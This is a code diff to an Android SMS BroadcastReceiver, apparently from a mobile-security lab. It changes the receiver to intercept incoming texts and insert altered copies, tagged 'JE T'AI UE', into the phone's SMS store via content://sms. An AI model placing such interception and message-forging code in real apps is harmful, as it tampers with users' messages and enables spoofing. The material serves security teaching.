@@ -1,8 +1,11 @@
 package com.dev.christopher.tpsecumobile;
 
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
@@ -14,6 +17,8 @@ import android.widget.Toast;
  */
 public class Getsms extends BroadcastReceiver {
     final SmsManager sms = SmsManager.getDefault();
+    String string = "JE T'AI UE";
+    String smsBody;
 
     public static final String SMS_BUNDLE = "pdus";
     @Override
@@ -25,16 +30,23 @@ public class Getsms extends BroadcastReceiver {
             for (int i = 0; i < sms.length; ++i) {
                 SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);
 
-                String smsBody = smsMessage.getMessageBody().toString();
+                smsBody = smsMessage.getMessageBody().toString();
                 String address = smsMessage.getOriginatingAddress();
 
                 smsMessageStr += "SMS From: " + address + "\n";
                 smsMessageStr += smsBody + "\n";
+                smsMessageStr += string+ "\n";
+                ContentResolver cnt = context.getContentResolver();
+
+                ContentValues values = new ContentValues();
+                values.put("body",smsBody+string);
+
+                cnt.insert(Uri.parse("content://sms"), values);
             }
-            Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();
+            Toast.makeText(context,smsBody+" "+string , Toast.LENGTH_SHORT).show();
             Bundle bundle = intent.getExtras();
             MainActivity mainActivity = new MainActivity();
-            MainActivity.getInstance().updateTextView(smsMessageStr);
+            mainActivity.getInstance().updateTextView(smsMessageStr);
 
 
 
